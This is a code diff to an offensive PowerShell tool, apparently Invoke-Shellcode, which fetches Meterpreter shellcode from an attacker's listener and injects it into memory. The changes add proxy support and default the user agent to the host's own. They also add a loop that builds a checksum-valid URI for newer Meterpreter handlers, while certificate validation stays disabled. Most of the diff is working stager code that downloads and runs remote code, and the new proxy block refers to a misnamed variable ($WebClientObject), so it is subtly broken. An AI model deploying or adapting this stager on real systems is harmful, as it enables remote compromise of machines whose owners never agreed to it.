@@ -49,6 +49,14 @@ Specifies the metasploit payload to use. Currently, only 'windows/meterpreter/re
 
 Optionally specifies the user agent to use when using meterpreter http or https payloads
 
+.PARAMETER Proxy
+
+Optionally specifies whether to utilize the proxy settings on the machine.
+
+.PARAMETER Legacy
+
+Optionally specifies whether to utilize the older meterpreter handler "INITM". This will likely be removed in the future. 
+
 .PARAMETER Force
 
 Injects shellcode without prompting for confirmation. By default, Invoke-Shellcode prompts for confirmation before performing any malicious act.
@@ -179,7 +187,17 @@ http://www.exploit-monday.com
     [Parameter( ParameterSetName = 'Metasploit' )]
     [ValidateNotNull()]
     [String]
-    $UserAgent = 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
+    $UserAgent = (Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings').'User Agent',
+
+    [Parameter( ParameterSetName = 'Metasploit' )]
+    [ValidateNotNull()]
+    [Switch]
+    $Legacy = $False,
+
+    [Parameter( ParameterSetName = 'Metasploit' )]
+    [ValidateNotNull()]
+    [Switch]
+    $Proxy = $False,
     
     [Switch]
     $Force = $False
@@ -586,18 +604,51 @@ http://www.exploit-monday.com
             {
                 $SSL = 's'
                 # Accept invalid certificates
-                [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
+                [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$True}
             }
         }
         
-        # Meterpreter expects 'INITM' in the URI in order to initiate stage 0. Awesome authentication, huh?
-        $Request = "http$($SSL)://$($Lhost):$($Lport)/INITM"
-        Write-Verbose "Requesting meterpreter payload from $Request"
-        
+        if ($Legacy) 
+        {
+            # Old Meterpreter handler expects 'INITM' in the URI in order to initiate stage 0
+            $Request = "http$($SSL)://$($Lhost):$($Lport)/INITM"
+            Write-Verbose "Requesting meterpreter payload from $Request"
+        } else {
+
+            # Generate a URI that passes the test
+            $CharArray = 48..57 + 65..90 + 97..122 | ForEach-Object {[Char]$_}
+            $SumTest = $False
+
+            while ($SumTest -eq $False) 
+            {
+                $GeneratedUri = $CharArray | Get-Random -Count 4
+                $SumTest = (([int[]] $GeneratedUri | Measure-Object -Sum).Sum % 0x100 -eq 92)
+            }
+
+            $RequestUri = -join $GeneratedUri
+
+            $Request = "http$($SSL)://$($Lhost):$($Lport)/$($RequestUri)" 
+        }
+           
         $Uri = New-Object Uri($Request)
         $WebClient = New-Object System.Net.WebClient
         $WebClient.Headers.Add('user-agent', "$UserAgent")
         
+        if ($Proxy)
+        {
+            $WebProxyObject = New-Object System.Net.WebProxy
+            $ProxyAddress = (Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings').ProxyServer
+            
+            # if there is no proxy set, then continue without it
+            if ($ProxyAddress) 
+            {
+            
+                $WebProxyObject.Address = $ProxyAddress
+                $WebProxyObject.UseDefaultCredentials = $True
+                $WebClientObject.Proxy = $WebProxyObject
+            }
+        }
+
         try
         {
             [Byte[]] $Shellcode32 = $WebClient.DownloadData($Uri)
@@ -708,6 +759,5 @@ http://www.exploit-monday.com
         {
             Inject-LocalShellcode
         }
-    }
-    
+    }   
 }
